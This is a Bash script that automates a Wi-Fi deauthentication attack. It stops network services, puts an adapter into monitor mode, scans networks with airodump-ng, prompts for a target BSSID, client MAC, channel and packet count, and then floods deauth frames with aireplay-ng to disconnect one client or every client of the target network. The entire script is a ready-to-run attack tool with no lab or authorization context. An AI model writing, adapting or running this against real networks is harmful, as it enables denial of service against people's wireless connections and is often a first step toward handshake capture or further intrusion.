#!/bin/bash

# Define colors for output formatting
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Initialize variables
adapter=""
pid=""
TARGET_BSSID=""
TARGET_MAC=""
CHANNEL=""
PACKETS=""

# Function to choose network adapter
choose_adapter() {
    echo -e "${BLUE}Available network adapters:${NC}"
    sudo ifconfig | grep -E '^[a-zA-Z0-9]+:'
    echo ""

    echo -e "${YELLOW}Choose the adapter you want to use:${NC}"
    read -r adapter

    # Validate that the adapter is not empty
    if [[ -z "$adapter" ]]; then
        echo -e "${RED}No adapter selected. Exiting...${NC}"
        exit 1
    fi
}

# Function to set up the adapter in monitor mode
setup_monitor_mode() {
    echo -e "${RED}Stopping network services...${NC}"
    if command -v systemctl &>/dev/null; then
        sudo systemctl stop NetworkManager
        sudo systemctl stop wpa_supplicant
    else
        sudo service network-manager stop
        sudo service wpa_supplicant stop
    fi

    echo -e "${GREEN}Setting up adapter $adapter in monitor mode...${NC}"
    sudo ip link set "$adapter" down
    sudo iw dev "$adapter" set type monitor
    sudo ip link set "$adapter" up
}

# Function to start airodump-ng for scanning networks
start_airodump() {
    echo -e "${YELLOW}Starting airodump-ng on $adapter...${NC}"
    
    # Run airodump-ng directly in the same terminal
    sudo airodump-ng "$adapter"
}

# Function to select target network and attack parameters
choose_targets() {
    echo -e "${BLUE}Enter the BSSID of the target network:${NC}"
    read -r TARGET_BSSID

    # Validate BSSID input
    if [[ ! "$TARGET_BSSID" =~ ^([a-fA-F0-9]{2}[:-]){5}[a-fA-F0-9]{2}$ ]]; then
        echo -e "${RED}Invalid BSSID format. Exiting...${NC}"
        exit 1
    fi

    echo -e "${BLUE}Enter the MAC address of the client to deauth (leave blank for all clients):${NC}"
    read -r TARGET_MAC

    # Validate MAC address if provided
    if [[ -n "$TARGET_MAC" && ! "$TARGET_MAC" =~ ^([a-fA-F0-9]{2}[:-]){5}[a-fA-F0-9]{2}$ ]]; then
        echo -e "${RED}Invalid MAC address format. Exiting...${NC}"
        exit 1
    fi

    echo -e "${BLUE}Enter the channel number for the target network:${NC}"
    read -r CHANNEL

    # Validate channel input
    if [[ ! "$CHANNEL" =~ ^[0-9]+$ ]] || [[ "$CHANNEL" -lt 1 ]] || [[ "$CHANNEL" -gt 14 ]]; then
        echo -e "${RED}Invalid channel number. Exiting...${NC}"
        exit 1
    fi

    echo -e "${BLUE}Enter the number of deauth packets to send:${NC}"
    read -r PACKETS

    # Validate packet count input
    if [[ ! "$PACKETS" =~ ^[0-9]+$ ]] || [[ "$PACKETS" -lt 1 ]]; then
        echo -e "${RED}Invalid packet count. Exiting...${NC}"
        exit 1
    fi

    echo ""
    echo -e "${RED}You are about to perform a deauth attack with the following details:${NC}"
    echo -e "${YELLOW}Target BSSID: $TARGET_BSSID${NC}"
    echo -e "${YELLOW}Target MAC: $TARGET_MAC${NC}"
    echo -e "${YELLOW}Channel: $CHANNEL${NC}"
    echo -e "${YELLOW}Number of packets: $PACKETS${NC}"
    echo ""
    read -rp "Do you want to continue? (y/n): " confirmation

    if [[ "$confirmation" != "y" ]]; then
        echo -e "${RED}Operation cancelled.${NC}"
        exit 0
    fi
}

# Function to perform deauth attack
perform_deauth_attack() {
    echo -e "${YELLOW}Setting adapter to channel $CHANNEL...${NC}"
    sudo iwconfig "$adapter" channel "$CHANNEL"

    if [ -z "$TARGET_MAC" ]; then
        echo -e "${GREEN}Performing deauthentication attack on all clients...${NC}"
        sudo aireplay-ng --deauth "$PACKETS" -a "$TARGET_BSSID" "$adapter"
    else
        echo -e "${GREEN}Performing deauthentication attack on client $TARGET_MAC...${NC}"
        sudo aireplay-ng --deauth "$PACKETS" -a "$TARGET_BSSID" -c "$TARGET_MAC" "$adapter"
    fi

    echo -e "${GREEN}Deauth attack completed.${NC}"
}

# Function to restart network services
restart_services() {
    echo -e "${RED}Starting network services...${NC}"
    if command -v systemctl &>/dev/null; then
        sudo systemctl start NetworkManager
        sudo systemctl start wpa_supplicant
    else
        sudo service network-manager start
        sudo service wpa_supplicant start
    fi
}

# Function to clean up and restore network adapter
cleanup() {
    echo -e "${RED}Restoring network adapter state...${NC}"
    sudo ip link set "$adapter" down
    sudo iw dev "$adapter" set type managed
    sudo ip link set "$adapter" up
    restart_services
}

# Trap to ensure cleanup happens on exit
trap cleanup EXIT

# Main execution flow
choose_adapter
setup_monitor_mode
start_airodump
choose_targets
perform_deauth_attack

echo -e "${RED}Deauth attack completed. Cleaning up...${NC}"
